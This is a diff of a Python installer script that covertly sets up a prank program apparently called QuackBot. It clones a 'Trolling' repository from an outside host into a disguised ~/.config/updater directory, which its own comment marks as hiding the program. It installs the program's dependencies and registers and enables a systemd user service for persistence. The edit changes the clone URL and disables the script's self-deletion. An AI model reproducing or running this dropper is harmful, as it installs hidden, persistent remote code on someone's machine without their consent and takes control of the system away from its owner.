@@ -3,6 +3,7 @@ import subprocess
 import shlex
 import os
 
+# use bash in a more friendly way
 def invoke_command(command: str) -> str:  
     print(command)
     parsed_command: list[str] = shlex.split(command)
@@ -14,12 +15,13 @@ def invoke_command(command: str) -> str:
         exit(1) # If error happens dump information then abort
     return result
 
-
+# Hide the program
 home = os.path.expanduser('~')
 git_directory = f"{home}/.config/updater"
 working_directory = f"{git_directory}/QuackBot"
 start_path = f"/usr/bin/bash {working_directory}/quack.sh"
 
+# Create systemd service
 startfile = f"{working_directory}/bin/python3 {working_directory}/src/Quack.py"
 servicefile = f"""
 [Unit]
@@ -32,11 +34,10 @@ Type=simple
 
 [Install]
 WantedBy=default.target
-
 """
 
 invoke_command(f"rm {git_directory} -rf")
-invoke_command(f"git clone https://codeberg.org/sadneutrino/Trolling.git {git_directory}")
+invoke_command(f"git clone https://github.com/Kisbogyi/Trolling.git {git_directory}")
 invoke_command(f"python3 -m venv {working_directory}")
 invoke_command(f"{working_directory}/bin/python3 -m pip install -r requirements.txt")
 invoke_command(f"rm {home}/.config/systemd/user/quack.service -rf")
@@ -47,4 +48,4 @@ with open(f"{home}/.config/systemd/user/quack.service", "w") as service_f:
 invoke_command("systemctl start --user quack.service")
 invoke_command("systemctl enable --user quack.service")
 
-os.remove(__file__)
+#os.remove(__file__)
